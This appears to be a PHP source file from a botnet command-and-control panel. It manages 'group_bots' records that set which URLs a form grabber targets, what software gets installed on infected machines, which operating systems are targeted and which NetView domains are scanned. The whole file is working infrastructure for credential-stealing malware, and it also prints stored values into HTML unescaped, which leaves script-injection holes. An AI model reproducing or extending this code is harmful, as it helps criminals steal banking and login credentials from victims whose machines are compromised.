<?php

class Model_Edit_Role extends Model
{
    public function getGroup()
    {
        $group_id = $this->request_data['group_id'];

        $group_info = $this->getDB()->queryRow('SELECT * FROM `group_bots` WHERE id=:id', array(':id' => $group_id));

        if (!empty($group_info)) {
            echo '<h5><label>Name Group</label></h5>
                        <input type="text" class="form-control" id="name_group" value="' . $group_info['name_group'] . '"/>
<div role="tabpanel" class="tab-pane active fade in" id="tab-software">
                        <input type="hidden" id="group_id" value="' . $group_id . '"/>
                            <h5><label>List install Software:</label></h5>
                            <textarea placeholder="Format example -> Google Chrome, Firefox" class="form-control"
                                      id="list_install_software"
                                      name="list_install_software">' . $group_info['list_install_app'] . '</textarea>
                        </div>
                        <div role="tabpanel" class="tab-pane fade" id="tab-form-grabber">
                            <h5><label>List url for Form Grabber:</label></h5>
                            <textarea placeholder="Format example -> google.com, bingo.com" class="form-control"
                                      id="list_url_form_grabber"
                                      name="list_url_form_grabber">' . $group_info['list_url_form_grabber'] . '</textarea>
                        </div>
                        <div role="tabpanel" class="tab-pane fade" id="tab-os">
                            <h5><label>List Operation Systems:</label></h5>
                            <textarea placeholder="Format example -> Windows 10 Pro, Windows 7" class="form-control"
                                      id="list_os" name="list_os">' . $group_info['list_os'] . '</textarea>
                        </div>
                        <div role="tabpanel" class="tab-pane fade" id="tab-netview">
                            <h5><label>List NetView Domain:</label></h5>
                            <textarea placeholder="Format example -> SYSTEMGROUP, WORKGROUP" class="form-control"
                                      id="list_netview_domain"
                                      name="list_netview_domain">' . $group_info['list_domain_netview'] . '</textarea>
                        </div>';
        }
    }

    public function EditGroup()
    {
        if ($this->checkInfoEditCorrect()) {
            $edit_group_id = $this->request_data['group_id'];
            $edit_name_group = $this->request_data['name_group'];
            $edit_list_install_app = $this->request_data['list_install_app'];
            $edit_list_url_form_grabber = $this->request_data['list_url_form_grabber'];
            $edit_list_os = $this->request_data['list_os'];
            $edit_list_domain_netview = $this->request_data['list_domain_netview'];

            $this->getDB()->update('group_bots', array('name_group' => $edit_name_group, 'list_install_app' => $edit_list_install_app, 'list_url_form_grabber' => $edit_list_url_form_grabber, 'list_os' => $edit_list_os, 'list_domain_netview' => $edit_list_domain_netview), 'id=:id', array(':id' => $edit_group_id));
            return true;
        } else {
            return false;
        }
    }

    public function deleteGroup()
    {
        if (!empty($this->request_data['group_id'])) {
            $id = $this->request_data['group_id'];

            $this->getDB()->sql("DELETE FROM `group_bots` WHERE `id`=:id", array(':id' => $id));
            return true;
        } else {
            return false;
        }
    }

    private function checkInfoEditCorrect()
    {
        if (!empty($this->request_data['group_id']) &&
            (!empty($this->request_data['name_group']))) {
            return true;
        } else {
            return false;
        }
    }
}

?>